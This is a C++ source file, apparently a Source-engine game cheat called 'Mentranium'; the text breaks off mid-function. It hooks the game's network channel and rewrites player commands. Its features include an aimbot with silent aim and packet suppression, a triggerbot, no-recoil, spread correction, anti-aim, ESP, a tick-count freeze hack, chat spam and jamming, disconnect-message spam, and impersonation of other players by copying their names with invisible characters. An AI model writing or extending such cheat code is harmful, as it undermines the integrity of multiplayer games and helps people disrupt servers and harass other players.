

#include "utils.h"

// Convert a wide Unicode string to an UTF8 string
std::string utf8_encode(const std::wstring &wstr)
{
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo( size_needed, 0 );
    WideCharToMultiByte                  (CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}


void Mentranium_NameSteal()
{

	if ( menu->M_NameChanger != 1 )
		return;

	int theIndax = ( rand() % MaximumClients );


	while ( bIsBadIndex(theIndax) == true )
	{

		theIndax = ( rand() %  MaximumClients );

		if ( bIsBadIndex(theIndax) == false && theIndax != g_LocalPlayerNum )
			break;

	}

	player_info_s pInfo; 

	g_pEngine->GetPlayerInfo( theIndax, &pInfo );

	if ( pInfo.name )
	{
		string name = pInfo.name;



		string name1 = string(name.c_str());
		string name2 = string(name.c_str());

		name1.erase(name1.length()/2, name1.length());
		name2.erase(0, name2.length()/2);

		const wchar_t *chr1 = L"‬";

		string dick = utf8_encode(chr1);
		string dick2 = dick + name1 + dick + name2;

		Mentranium_Name( dick2.c_str() );
	
	}

}

void __fastcall newShutdown( void* thisptr, int edx, const char *dc_string )
{
	bIsReady = false;
	pLocalEntity = NULL;
	pAimEntity = NULL;
	pAimVec.x = 0;
	pAimVec.y = 0;
	pAimVec.z = 0;
	pLocalWeapon = NULL;
	oldView = QAngle(0,0,0);
	oldSidemove = 0;
	oldForwardmove = 0;
	oldUpmove = 0;
	HighestEntityIndex = 0;
	MaximumClients = 0;
	HighestEntityIndex = 0;
	g_LocalPlayerNum = 0;
	highSeedNum = 0;

	if ( menu->M_DisconnectSpam )
	{
		string ballsdeep;

		int i = 1;

		while (i <= 500)
		{
			ballsdeep.append("\n");
			i++;
		}

		dc_string = ballsdeep.c_str();
	}

	return ShutdownFn( thisptr, edx, dc_string );
}



void AntiAntiAimProxy( const CRecvProxyData *pData, void *pStruct, void *pOut )
{
	Msg("PRAWXEH");
	Msg("\n");
	float p = pData->m_Value.m_Float;

	if( p > 180.0f )
		p -= 360.0f;

	if( p < -180.0f )
		p += 360.0f;
               
	//anti EA
	if( p < -90)
		p = 270.0f;

	if( p > 90 )
		p = 90.0f;
               
	*(float*)pOut = p;
}

char* InitNetvars()
{


	m_fFlags = GetNetvarOffset("DT_BasePlayer", "m_fFlags");

	if ( !m_fFlags )
		return "no m_fFlags !";

	m_iHealth = GetNetvarOffset("DT_BasePlayer", "m_iHealth");

	if ( !m_iHealth )
		return "no m_iHealth";

	m_lifeState = GetNetvarOffset("DT_BasePlayer", "m_lifeState");
	
	if ( !m_lifeState )
		return "no m_lifeState";

	m_iTeamNum = GetNetvarOffset( "DT_BasePlayer", "m_iTeamNum" );

	if ( !m_iTeamNum )
		m_iTeamNum = GetNetvarOffset( "DT_BaseEntity", "m_iTeamNum" );

	if ( !m_iTeamNum )
		return "no m_iTeamNum";

	m_vecPunchAngle = GetNetvarOffset( "DT_Local", "m_vecPunchAngle" );

	if ( !m_vecPunchAngle )
		return "no m_VecPunchAngle !";

	m_vecPunchAngleVel = GetNetvarOffset( "DT_Local", "m_vecPunchAngleVel" );

	if ( !m_vecPunchAngleVel )
		return "no m_vecPunchAngleVel !";

	m_fVecViewOffset = GetNetvarOffset( "DT_LocalPlayerExclusive", "m_vecViewOffset[0]" );

	if ( !m_fVecViewOffset )
		return "no m_fVecViewOffset";

	m_fLocal = GetNetvarOffset( "DT_LocalPlayerExclusive", "m_Local" );

	if ( !m_fLocal )
		return "no m_fLocal";

	m_fVecOrigin = GetNetvarOffset( "DT_BaseEntity", "m_vecOrigin" );

	if ( !m_fVecOrigin )
		return "no m_fVecOrigin !";

	m_vVelocity = GetNetvarOffset( "DT_BasePlayer", "m_vecVelocity[0]" );

	if ( !m_vVelocity )
		m_vVelocity = GetNetvarOffset( "DT_BaseEntity", "m_vecVelocity[0]" );

	if ( !m_vVelocity )
		m_vVelocity = GetNetvarOffset( "DT_LocalPlayerExclusive", "m_vecVelocity[0]");

	if ( !m_vVelocity )
		m_vVelocity = GetNetvarOffset( "DT_BaseCombatCharacter", "m_vecVelocity[0]");

	if ( !m_vVelocity )
		m_vVelocity = GetNetvarOffset( "DT_Local", "m_vecVelocity[0]");

	if ( !m_vVelocity )
		return "no m_vVelocity !";

	m_flNextPrimaryAttack = GetNetvarOffset( "DT_LocalActiveWeaponData", "m_flNextPrimaryAttack" );

	if ( !m_flNextPrimaryAttack )
		return "no m_flNextPrimaryAttack !";

	m_flNextSecondaryAttack = GetNetvarOffset( "DT_LocalActiveWeaponData", "m_flNextSecondaryAttack" );

	if ( !m_flNextSecondaryAttack )
		return "no m_flNextSecondaryAttack !";

	m_iClip1 = GetNetvarOffset( "DT_LocalWeaponData", "m_iClip1" );

	if ( !m_iClip1 )
		return "no m_iClip1 !";

	m_hActiveWeapon = GetNetvarOffset( "DT_BaseCombatCharacter", "m_hActiveWeapon" );

	if ( !m_hActiveWeapon )
		return "no m_hActiveWeapon !";

	m_nTickBase = GetNetvarOffset( "DT_LocalPlayerExclusive", "m_nTickBase" );

	if ( !m_nTickBase )
		return "no m_nTickBase !";

	m_angEyeAngles = GetNetvarOffset( "DT_HL2MPNonLocalPlayerExclusive", "m_angEyeAngles[0]");

	if ( !m_angEyeAngles )
		m_angEyeAngles = GetNetvarOffset( "DT_CSPlayer", "m_angEyeAngles[0]");

	if ( !m_angEyeAngles )
		m_angEyeAngles = GetNetvarOffset( "DT_TFLocalPlayerExclusive", "m_angEyeAngles[0]");

	if ( !m_angEyeAngles )
		return "no m_angEyeAngles !";

	m_flSimulationTime = GetNetvarOffset( "DT_BaseEntity", "m_flSimulationTime" );

	if ( !m_flSimulationTime )
		return "no m_flSimulationTime !";

	if ( g_AppID == 440 )
	{

		TF2_m_bReadyToBackstab = GetNetvarOffset( "DT_TFWeaponKnife", "m_bReadyToBackstab" );

		if ( !TF2_m_bReadyToBackstab )
			return "no TF2_m_bReadyToBackstab !";

		TF2_m_Shared = GetNetvarOffset( "DT_TFPlayer", "m_Shared" );

		if ( !TF2_m_Shared )
			return "no TF2_m_Shared !";

		TF2_m_nPlayerCond = GetNetvarOffset( "DT_TFPlayerShared", "m_nPlayerCond" );

		if ( !TF2_m_nPlayerCond )
			return "no TF2_m_nPlayerCond !";

		TF2_m_i_objHealth = GetNetvarOffset( "DT_BaseObject", "m_iHealth" );

		if ( !TF2_m_i_objHealth )
			return "no TF2_m_i_objHealth !";

	}

	return NULL;
}

void Mentranium_InitGame()
{

	bool is_ingame = g_pEngine->IsInGame() && g_pEngine->IsConnected()&& !g_pEngine->IsDrawingLoadingImage();

	if ( !is_ingame )
	{
		return;
	}

	if ( !CreateMove_EBP )
		return;

	g_LocalPlayerNum = g_pEngine->GetLocalPlayer();

	IClientEntity *iLocalEntity = g_pEntList->GetClientEntity( g_LocalPlayerNum );

	if ( iLocalEntity )
		pLocalEntity =  dynamic_cast<C_BasePlayer*>(iLocalEntity);

	if ( !ShutdownFn )
	{
		g_NetChan = (INetChannel *)g_pEngine->GetNetChannelInfo();

		if ( !g_NetChan )
			return;

		channelHook = new CVMTHook( g_NetChan );
		ShutdownFn = (OriginalShutdown)channelHook->hookFunction( 36, newShutdown );

	}

	HighestEntityIndex = g_pEntList->GetHighestEntityIndex();
	MaximumClients = g_pEngine->GetMaxClients();

	if ( MaximumClients >= HighestEntityIndex )
		HighestEntityIndex = MaximumClients;

	bIsReady = true;

}

void Mentranium_Initating()
{
	while( true )
	{
		Sleep(3000);
		if ( bIsReady )
		{
			continue;
		}
		Mentranium_InitGame();


	}

	
}

string jamcontent;
void Mentranium_Think()
{

	if ( !bIsReady )
		return;

	bool is_ingame = g_pEngine->IsConnected() && g_pEngine->IsInGame() && !g_pEngine->IsDrawingLoadingImage();

	if ( !is_ingame )
		bIsReady = false;

	g_LocalPlayerNum = g_pEngine->GetLocalPlayer();

	IClientEntity *iLocalEntity = g_pEntList->GetClientEntity( g_LocalPlayerNum );

	if ( iLocalEntity )
		pLocalEntity =  dynamic_cast<C_BasePlayer*>(iLocalEntity);

	if ( g_pEntList->GetHighestEntityIndex() > HighestEntityIndex )
		HighestEntityIndex = g_pEntList->GetHighestEntityIndex();

	if ( g_pEntList->GetHighestEntityIndex() > HighestEntityIndex )
		MaximumClients = g_pEngine->GetMaxClients();

	if ( MaximumClients >= HighestEntityIndex )
		HighestEntityIndex = MaximumClients;

	if ( menu->M_ChatSpam && &menu->T_ChatSpam )
	{
		if ( menu->T_ChatSpam.length() != 0 )
		{
			if ( !menu->M_TextChatTeam )
				Mentranium_Say( menu->T_ChatSpam.c_str() );
			else
				Mentranium_TeamSay( menu->T_ChatSpam.c_str() );
		}
	}

	if ( menu->M_ChatJammer )
	{

		if ( jamcontent.length() < 1 )
		{
			string sex = ":";
			for (int i=0; 230 > i; i++)
			{
				sex = sex + string( "\n" );
			}
			sex = sex + string( ":");
			jamcontent	= sex;
			Msg("[(Mentranium)] Created Jam Content !");
		}

		if ( !menu->M_TextChatTeam )
			Mentranium_Say( jamcontent.c_str() );
		else
			Mentranium_TeamSay( jamcontent.c_str() );
	}

	h_iLocalTeam = GetTeam(pLocalEntity);

	Mentranium_NameSteal();
}

bool GetVisible( Vector& vecAbsStart, Vector& vecAbsEnd, C_BaseEntity* target=0  ) 
{ 
	trace_t tr;
	Ray_t pRay;

	CTraceFilter filter;

	pRay.Init( vecAbsStart, vecAbsEnd );
	g_pEngineTrace->TraceRay( pRay, MASK_SHOT, &filter, &tr );


	if ( tr.fraction == 1.f )
	{
		return true;
	}

	if ( tr.m_pEnt && target )
	{
		if ( tr.m_pEnt->entindex() == 0 || tr.allsolid )
			return false;

		if ( tr.m_pEnt->entindex() == target->entindex() )
			return true;
	}

	return false;
}

/*
enum hitboxes
{
HITGROUP_GENERIC= 0,
HITGROUP_HEAD= 1,
HITGROUP_CHEST= 2,
HITGROUP_STOMACH= 3,
HITGROUP_LEFTARM= 4,
HITGROUP_RIGHTARM= 5,
HITGROUP_LEFTLEG= 6,
HITGROUP_RIGHTLEG= 7,
HITGROUP_GEAR= 10,
};*/


bool CalculateAimVector(C_BaseEntity* player, Vector& vec, int hitgroup) 
{
	Vector myvec;

	IClientRenderable* renderable = static_cast<IClientRenderable*>(player);

	if (!renderable)
		return false;

	const model_t* model = renderable->GetModel();

	if (!model)
		return false;

	studiohdr_t* studiohdr = g_pModelInfo->GetStudiomodel( model );

	if (!studiohdr)
		return false;

	matrix3x4_t boneMatrix[128];
	
	if ( !m_flSimulationTime )
		return false;

	if ( !(DWORD)player )
		return false;

	if ( !((DWORD)player + m_flSimulationTime) )
		return false;

	float flSimulationTime = *(int*)((DWORD)player + m_flSimulationTime);

	if (!player->SetupBones(boneMatrix, 128, BONE_USED_BY_HITBOX, flSimulationTime ))
		return false;

	mstudiobbox_t* hitbox;

	if ( menu->S_HitGroup )
		hitgroup = menu->S_HitGroup;

	if ( menu->M_Aim_RandomHitgroup )
		hitgroup = RandomInt(1, 7);

	for (int i = 0; i <studiohdr->iHitboxCount(0); ++i)
	{
		if ( i > 1000 )
			break;
		hitbox = studiohdr->pHitbox(i, 0);

		if (!hitbox)
			continue;
		
		if ( hitbox->group != hitgroup )
			continue;

		Vector min_vec, max_vec;

		VectorTransform(hitbox->bbmin, boneMatrix[hitbox->bone], min_vec);
		VectorTransform(hitbox->bbmax, boneMatrix[hitbox->bone], max_vec);

		Vector origin = (min_vec + max_vec) * 0.5f;

		myvec = origin;

		break;
	}

	if ( myvec.x < 0.0001 && myvec.x > -0.0001 && myvec.y < 0.0001 && myvec.y > -0.0001 && myvec.z < 0.0001 && myvec.z > -0.0001 )
		return false;

	vec = myvec;

	return true;
}

float GetFov( QAngle angle, Vector src, Vector dst ) 
{ 
	QAngle ang,aim; 
	float fov; 

	CalcAngle(src, dst, ang); 
	MakeVector(angle, aim); 
	MakeVector(ang, ang);      

	float mag_s = sqrt((aim[0]*aim[0]) + (aim[1]*aim[1]) + (aim[2]*aim[2])); 
	float mag_d = sqrt((aim[0]*aim[0]) + (aim[1]*aim[1]) + (aim[2]*aim[2])); 

	float u_dot_v = aim[0]*ang[0] + aim[1]*ang[1] + aim[2]*ang[2]; 

	fov = acos(u_dot_v / (mag_s*mag_d)) * (180.0 / M_PI); 

	return fov; 
}

void RunPrediction( CUserCmd* pCmd )
{
	int oldCount = g_pGlobals->tickcount;
	int oldTick = pCmd->tick_count;
	int oldCmdNum = pCmd->command_number;
	int oldButtons = pCmd->buttons;
	int oldHeader = pCmd->header;

	C_CommandContext *ctx = pLocalEntity->GetCommandContext();
	
	if ( !ctx )
		return;

	if ( !g_pGlobals->tickcount )
		return;

	bool o_needproc = ctx->needsprocessing;
	CUserCmd  *oCmd = &ctx->cmd;
	int onum = ctx->command_number;

	ctx->needsprocessing = true;
	ctx->cmd = *pCmd;
	ctx->command_number = pCmd->command_number;

	g_pGlobals->tickcount = oldCount - 5;

	pLocalEntity->PhysicsSimulate();

	g_pGlobals->tickcount = oldCount;

	ctx->needsprocessing = o_needproc;
	ctx->command_number = onum;
	ctx->cmd = *oCmd;

	pCmd->tick_count = oldTick;
	pCmd->command_number = oldCmdNum;
	pCmd->buttons = oldButtons;
	pCmd->header = oldHeader;

}

Vector GetTarget( CUserCmd *pCmd )
{

	RunPrediction( pCmd );

	float bestRate = 999999999;

	C_BaseEntity *best_targ = 0;

	Vector localEyePos = GetEyePosition(pLocalEntity);
	Vector tarvec = Vector(0,0,0);

	int goby;

	if ( menu->M_Aim_KillNPC )
		goby = HighestEntityIndex;
	else
		goby = MaximumClients;

	int a = 0;

	for( int i = 0; goby+1 > i; i++ )
	{
		a++;

		if ( a > 99000 )
			break;

		if( i == g_LocalPlayerNum )
			continue;

		if ( i < 1 )
			continue;

		C_BaseEntity *clEnt = (C_BaseEntity*)g_pEntList->GetClientEntity(i);

		if ( !clEnt )
			continue;

		if ( clEnt->IsDormant() )
		{
			clEnt = NULL;
			continue;
		}

		if ( clEnt->entindex() < 1 )
		{
			clEnt = NULL;
			continue;
		}

		bool is_living = false;
		bool is_npc = false;

		const char *classname = clEnt->GetClassname();

		if ( !classname )
		{
			clEnt = NULL;
			continue;
		}
		
		if ( menu->M_Aim_KillPlayer && ( strcmp(classname, "player") == 0 || strstr(classname, "Player") ) )
			is_living = true;

		if ( menu->M_Aim_KillNPC && ( strstr(classname, "npc_") || strstr(classname, "obj_") ) )
		{
			is_living = true;
			is_npc = true;
		}

		if ( !is_living )
		{
			clEnt = NULL;
			continue;
		}

		if ( menu->M_Aim_TeamKill == 0 )
		{
			if ( isFriendlyTeam(clEnt) )
			{
				clEnt = NULL;
				continue;
			}
		}

		if ( !IsAlive(clEnt) )
			continue;

		Vector vec;

		bool gothitbox = CalculateAimVector( clEnt, vec, 1 );
		
		if ( !menu->M_Aim_Hitscan )
		{

			if ( !gothitbox )
			{
				clEnt = NULL;
				continue;
			}
			
			if ( !GetVisible( localEyePos, vec, clEnt ) )
			{
				clEnt = NULL;
				continue;
			}

		}else{

			if ( !GetVisible( localEyePos, vec, clEnt ) || !gothitbox )
			{
				gothitbox = CalculateAimVector( clEnt, vec,  0);

				if ( !GetVisible( localEyePos, vec, clEnt ) || !gothitbox)
				{
					gothitbox = CalculateAimVector( clEnt, vec, 2 );

					if ( !GetVisible( localEyePos, vec, clEnt ) || !gothitbox )
					{
						gothitbox = CalculateAimVector( clEnt, vec, 3 );

						if ( !GetVisible( localEyePos, vec, clEnt ) || !gothitbox )
						{
							gothitbox = CalculateAimVector( clEnt, vec, 4 );

							if ( !GetVisible( localEyePos, vec, clEnt ) || !gothitbox )
							{
								gothitbox = CalculateAimVector( clEnt, vec, 5 );

								if ( !GetVisible( localEyePos, vec, clEnt ) || !gothitbox)
								{
									gothitbox = CalculateAimVector( clEnt, vec, 6 );

									if ( !GetVisible( localEyePos, vec, clEnt ) || !gothitbox )
									{
										gothitbox = CalculateAimVector( clEnt, vec, 7 );

										if ( !GetVisible( localEyePos, vec, clEnt ) || !gothitbox )
										{
												continue;
										}
									}
								}
							}
						}
					}
				}
			}

		}

		if ( menu->S_Aim_FOV > 2 )
		{
			float fov = menu->S_Aim_FOV;

			if ( GetFov( pLocalEntity->GetAbsAngles(), localEyePos, vec ) > fov )
				continue;
		}

		float pRate = AimbotRate( clEnt, is_npc, menu->S_TargetMode );

		if ( pRate < bestRate )
		{
			best_targ = clEnt;
			bestRate = pRate;
			tarvec = vec;
		}
	}
	
	
	if ( best_targ )
	{
		if ( tarvec.x != 0 && tarvec.y != 0 && tarvec.z != 0 )
		{

			pAimEntity = best_targ;
			pAimVec = tarvec;
			Vector tarSpeed = GetVelocity(  pAimEntity  ) * 0.013;
			Vector plySpeed = GetVelocity( pLocalEntity ) * 0.013;
			pAimVec = pAimVec - ( plySpeed + tarSpeed );
		}

	}

	return tarvec;
}

C_BaseEntity *bTraceToTarget( CUserCmd *cmd )
{
	C_BaseEntity *nullEnt = NULL;

	Vector Eyes, Forward;
	QAngle Angles = cmd->viewangles;
	trace_t tr;
	Ray_t pRay;

	Eyes = GetEyePosition(pLocalEntity);
    
	Angles = cmd->viewangles;

	Vector vDirection;

	AngleVectors( Angles, &vDirection );

	vDirection = vDirection * 8192 + Eyes;

	pRay.Init( Eyes, vDirection );

	g_pEngineTrace->TraceRay( pRay, MASK_SHOT, NULL, &tr );

	if ( !tr.m_pEnt )
	{
		return nullEnt;
	}

	if ( tr.m_pEnt->entindex() == 0 )
	{
		return nullEnt;
	}

	bool found = false;
	bool is_npc = false;

	const char *classname = "";

	classname = tr.m_pEnt->GetClassname();

	if ( !classname )
		return nullEnt;

	if ( menu->M_Aim_KillPlayer && ( strcmp(classname, "player") == 0 || strstr(classname, "Player") ) )
		found = true;

	if ( menu->M_Aim_KillNPC && ( strstr(classname, "npc_") || strstr(classname, "obj_") ) )
	{
		found = true;
		is_npc = true;
	}
		

	if ( !found )
		return nullEnt;

	if ( menu->M_Aim_TeamKill == 0 )
	{

		if ( isFriendlyTeam(tr.m_pEnt) )
			return nullEnt;
	}

	return tr.m_pEnt;
}

void FixMove(CUserCmd *cmd, const QAngle& va)
{

	float yaw, speed;
	Vector& move = *(Vector*) &cmd->forwardmove;

	speed = sqrt(move.x*move.x + move.y*move.y);

	yaw = RAD2DEG(atan2(move.y, move.x));
	yaw = DEG2RAD(cmd->viewangles.y - va.y + yaw);

	cmd->forwardmove = cos(yaw) * speed;
	cmd->sidemove = sin(yaw) * speed;

}

bool SkipReload = false;

void HighsBoson( CUserCmd *T );

void FixShot( CUserCmd *cmd )
{
	
	if ( g_AppID != 4000 ) // gmod only
		return;

	static C_BaseEntity* lastw = NULL;

	if ( !pLocalWeapon )
		return;

	if ( lastw && lastw != pLocalWeapon )
	{
		lastw = pLocalWeapon;
		currentSpread.Zero();
		return;
	}

	if ( !(cmd->buttons & IN_ATTACK) )
		return;

	RandomSeed( MD5_PseudoRandom(142) & 255 );
	float x = RandomFloat(-0.5f, 0.5f) + RandomFloat(-0.5f, 0.5f);
	float y = RandomFloat(-0.5f, 0.5f) + RandomFloat(-0.5f, 0.5f);

	Vector vForward, vRight, vUp;
	Vector vSpread = Vector(FloatNegate(currentSpread.x), FloatNegate(currentSpread.y), 0.f);

	NormalizeAngles(cmd->viewangles);
	AngleVectors(cmd->viewangles, &vForward, &vRight, &vUp);

	Vector vNewAngles = vForward + (vRight * vSpread.x * x) + (vUp * vSpread.y * y);

	VectorAngles(vNewAngles, cmd->viewangles);
	NormalizeAngles(cmd->viewangles);

}

void GetViewESP( CUserCmd *cmd )
{
	QAngle Angles = cmd->viewangles;

	Vector Eyes, Forward;
	trace_t tr;
	Ray_t pRay;

	Eyes = GetEyePosition(pLocalEntity);

	if ( Eyes.x == 0 && Eyes.y == 0 && Eyes.z == 0 )
		return;

	Vector vDirection;

	AngleVectors( Angles, &vDirection );

	vDirection = vDirection * 8192 + Eyes;

	if ( vDirection.x == 0 && vDirection.y == 0 && vDirection.z == 0 )
		return;

	CTraceFilterHitAll filter;


	pRay.Init( Eyes, vDirection );
	g_pEngineTrace->TraceRay( pRay, MASK_ALL, &filter, &tr);

	if ( !tr.m_pEnt || tr.m_pEnt->entindex() == 0 )
	{
		viewESP_Classname = NULL;
	}else{

		Vector org = GetAbsOrigin(tr.m_pEnt);

		if ( org.x == 0 && org.y == 0 && org.z == 0 )
		{
			viewESP_Classname = NULL;
		}else{

			viewESP_Classname = tr.m_pEnt->GetClassname();
			if ( !viewESP_Classname )
				viewESP_Classname = NULL;
		}
	}
}
void ProcessUserCommand( CUserCmd *cmd )
{

	if ( !g_pGlobals )
		return;

	if ( pLocalEntity == NULL )
		return;

	int im_iClip1 = -1;

	float fm_flNextPrimaryAttack, fm_flNextSecondaryAttack;

	int iFlags = GetFlags(pLocalEntity);

	int weaponIndex = GetActiveWepIndex( pLocalEntity );

	if ( weaponIndex )
		pLocalWeapon = dynamic_cast<C_BaseEntity*>(g_pEntList->GetClientEntity( weaponIndex ));

	flCurTime = GetCurTime();

	if ( pLocalWeapon )
	{
		fm_flNextPrimaryAttack = *(float*)((DWORD)pLocalWeapon + m_flNextPrimaryAttack);
		fm_flNextSecondaryAttack = *(float*)((DWORD)pLocalWeapon + m_flNextPrimaryAttack);

		im_iClip1 = *(int*)((DWORD)pLocalWeapon + m_iClip1);

	}

	if ( !IsAlive(pLocalEntity) )
	{
		if ( menu->M_ESP_ViewESP )
			GetViewESP( cmd );

		return;
	}
	if ( menu->M_FreezeHack )
	{
		cmd->tick_count = 0xFFFFF;
		return;
	}

	bool shouldShoot = false;

	if ( menu->M_ESP_ViewESP )
		GetViewESP( cmd );

	if ( menu->M_Bhop )
	{
		if ( !menu->M_Bhop_Perfect )
		{
			static bool firstjump = false, fakejmp;

			if ( (cmd->buttons & IN_JUMP) && pLocalEntity->GetWaterLevel() < 2)
				if (!firstjump)
					firstjump = fakejmp = true;
			else if ( !( iFlags & FL_ONGROUND ) )
				if ( /*true && */ fakejmp && GetVelocity(pLocalEntity).z < 0.0f)
					fakejmp = false;
			else
				cmd->buttons &= ~IN_JUMP;
			else
				fakejmp = true;
			else
				firstjump = false;
		}else{
			if ( (cmd->buttons & IN_JUMP) && !( iFlags & FL_ONGROUND ) )
			{
				cmd->buttons &= ~IN_JUMP;
			}
		}
	}

	if ( menu->M_FlashlightSpam )
	{
		cmd->impulse = 100;
	}

	if ( menu->M_NoRecoil )
	{
		QAngle vecPunchAng = *(QAngle*)((DWORD)pLocalEntity + m_fLocal + m_vecPunchAngle );

		if ( g_AppID == 240 )
		{
			float flModifier = 0;

			QAngle finale(0,0,0);

			flModifier = VectorNormalize( vecPunchAng.Base() );
			flModifier -= (10.0f + flModifier * 0.5f) * g_pGlobals->interval_per_tick;

			finale = (vecPunchAng*flModifier);

		
			finale = finale * 2.0f;
		
			cmd->viewangles -= finale;
		}else{
			cmd->viewangles -= vecPunchAng;
		}

		
	}

	static QAngle ffs(0,0,0);

	if ( menu->M_AimEnable == 1 && pLocalWeapon )
	{

		bool ammoFuck = true;

		if ( !menu->M_Aim_IgnoreAmmo && im_iClip1 < 1 )
			ammoFuck = false;

		Vector pos = Vector(0,0,0);

		if ( ammoFuck )
			pos = GetTarget( cmd );

		if ( pAimEntity != 0 && ammoFuck )
		{
			Vector swagEyePos = GetEyePosition(pLocalEntity);// + GetVelocity(pLocalEntity) * g_pGlobals->interval_per_tick;
			Vector aimPos = pos - swagEyePos;

			VectorAngles(aimPos, aimAngles);

			if ( menu->S_Aim_Smooth > 1 )
			{
				if ( cmd->viewangles.x != aimAngles.x || cmd->viewangles.y != aimAngles.y || cmd->viewangles.z != aimAngles.z )
				{
					if ( ffs.x == 0 && ffs.y == 0 && ffs.z == 0 )
					{
			 			ffs = cmd->viewangles;
					}else{
						QAngle angDelta = ffs - aimAngles;

						if ( angDelta.x == 0 && angDelta.y == 0 && angDelta.z == 0 )
						{
							ffs = cmd->viewangles;
						}else{
							NormalizeAngles( angDelta );
							float sh = (float)menu->S_Aim_Smooth;
							sh = sh/10;
							aimAngles = ffs - angDelta / sh;
							NormalizeAngles(aimAngles);
							ffs = aimAngles;
						}
					}
				}

			}

			QAngle aimAngles2 = aimAngles;

			if ( menu->M_NoRecoil == 1 )
			{
				QAngle vecPunchAng = *(QAngle*)((DWORD)pLocalEntity + m_fLocal + m_vecPunchAngle );

				if ( g_AppID == 240 )
				{
					float flModifier = 0;

					QAngle finale(0,0,0);
				
					flModifier = VectorNormalize( vecPunchAng.Base() );
					flModifier -= (10.0f + flModifier * 0.5f) * g_pGlobals->interval_per_tick;

					finale = (vecPunchAng*flModifier);

		
					finale = finale * 2.0f;
		
					aimAngles2 -= finale;
				}else{
					aimAngles2 -= vecPunchAng;
				}

			}

			NormalizeAngles(aimAngles2);

			oldForwardmove = cmd->forwardmove;
			oldSidemove = cmd->sidemove;
			oldUpmove = cmd->upmove;
			oldView = cmd->viewangles;

			cmd->viewangles = aimAngles2;

			if ( menu->M_Aim_Silent == 1  )
			{
				if ( fm_flNextPrimaryAttack <= flCurTime && !( cmd->buttons & IN_ATTACK ) )
				{
					if ( menu->M_Aim_PSilent == 1 )
						*bSendPacket = false;

					shouldShoot = true;
				}else{

					if ( menu->M_Aim_PSilent == 1 )
						*bSendPacket = true;

					cmd->viewangles = oldView;
					cmd->upmove = oldUpmove;
					cmd->sidemove = oldSidemove;
					cmd->forwardmove = oldForwardmove;
				}
				

				pAimEntity = NULL;
			}else{
				g_pEngine->SetViewAngles( cmd->viewangles );
				pAimEntity = NULL;

				if ( menu->M_TriggerBot )
					if ( !( cmd->buttons & IN_ATTACK ) )
						shouldShoot = true;

			}
			FixMove( cmd, oldView );
		}else{
			pAimEntity = NULL;

			if ( oldView.x != 0 && oldView.y != 0 && oldView.z != 0 )
			{
				if ( menu->M_Aim_Silent == 1 && menu->M_Aim_PSilent == 1 )
				{
					*bSendPacket = true;
				}
				cmd->viewangles = oldView;
				cmd->sidemove = oldSidemove;
				cmd->forwardmove = oldForwardmove;
				cmd->upmove = oldUpmove;
				oldView = QAngle(0,0,0);
				oldSidemove = 0;
				oldForwardmove = 0;
				oldUpmove = 0;
			}
		}
	}else{

		pAimEntity = NULL;

		if ( oldView.x != 0 && oldView.y != 0 && oldView.z != 0 )
		{

			if ( menu->M_Aim_Silent == 1 && menu->M_Aim_PSilent == 1 )
			{
				*bSendPacket = true;
			}

			cmd->viewangles = oldView;
			cmd->sidemove = oldSidemove;
			cmd->forwardmove = oldForwardmove;
			cmd->upmove = oldUpmove;
			oldView = QAngle(0,0,0);
			oldSidemove = 0;
			oldForwardmove = 0;
			oldUpmove = 0;
		}

	}

	if( menu->M_AntiAim && ( !shouldShoot && !(cmd->buttons &IN_ATTACK) ) )
	{
		float forward = cmd->forwardmove;
		float right = cmd->sidemove;
		float up = cmd->upmove;

		Vector viewforward, viewright, viewup, aimforward, aimright, aimup;
		QAngle v;

		v.Init(cmd->viewangles.y, cmd->viewangles.x, cmd->viewangles.z);
		AngleVectors( cmd->viewangles, &viewforward, &viewright, &viewup );

		static int swagga = 0;
		
		if ( swagga == 0 )
			cmd->viewangles = QAngle(181, -180, -180);
	
		if ( swagga == 1 )
			cmd->viewangles = QAngle(-181, -181, 180);

		if ( swagga == 2 )
			cmd->viewangles = QAngle(-181, -181, -181);

		if ( swagga == 3 )
			cmd->viewangles = QAngle(181, -180, -180);

		if ( swagga == 4 )
			cmd->viewangles = QAngle(181,181,181);
		
		if ( swagga == 5 )
			cmd->viewangles = QAngle(-180,-181,180);

		if ( swagga > 5 )
			swagga = 0;

		AngleVectors( cmd->viewangles, &aimforward, &aimright, &aimup );

		Vector vForwardNorm = viewforward * ( 1 / viewforward.Length() );
		Vector vRightNorm = viewright * ( 1 / viewright.Length() );
		Vector vUpNorm = viewup * ( 1 / viewup.Length() );

		cmd->forwardmove = DotProduct( forward * vForwardNorm, aimforward ) + DotProduct( right * vRightNorm, aimforward ) + DotProduct( up * vUpNorm, aimforward );
		cmd->sidemove = DotProduct( forward * vForwardNorm, aimright ) + DotProduct( right * vRightNorm, aimright ) + DotProduct( up * vUpNorm, aimright );
		cmd->upmove = DotProduct( forward * vForwardNorm, aimup ) + DotProduct( right * vRightNorm, aimup ) + DotProduct( up * vUpNorm, aimup );
	}

	if ( menu->M_AutoPistol == 1 && pLocalWeapon )
	{
		if ( cmd->buttons & IN_ATTACK )
		{
			shouldShoot = true;
		}

		if ( g_AppID == 440 )
		{
			const char *classname = pLocalWeapon->GetClassname();

			if ( strstr(classname, "knife") != 0 && IsReadyToBackstab( pLocalWeapon ) )
			{
				shouldShoot = true;
			}
		}

	}

	if ( menu->M_TriggerBot == 1 || menu->M_Aim_Correct == 1 )
	{
		C_BaseEntity *targ = bTraceToTarget(cmd);

		if ( targ )
		{

			if ( menu->M_TriggerBot )
				shouldShoot = true;

			if ( menu->M_Aim_Correct )
			{
				Vector vec;


				bool gothitbox = CalculateAimVector( targ, vec, 1 );

				if ( gothitbox )
				{
					Vector localEyePos = GetEyePosition(pLocalEntity);
					if ( GetVisible( localEyePos, vec, targ ) )
					{
						QAngle CorrectAng;
						VectorAngles(vec - localEyePos, CorrectAng);
						NormalizeAngles( CorrectAng );
						g_pEngine->SetViewAngles( CorrectAng );

					}
				}
			}
		}

	}

	if ( shouldShoot )
	{
		if ( g_AppID == 440 )
		{
			cmd->buttons |= IN_ATTACK;
		}else{
			if ( fm_flNextPrimaryAttack <= flCurTime )
			{

				if (!( cmd->buttons & IN_ATTACK ))
					cmd->buttons |= IN_ATTACK;
			}else{

				if ( cmd->buttons & IN_ATTACK )
					cmd->buttons &= ~IN_ATTACK;
			}
		}
	}else{

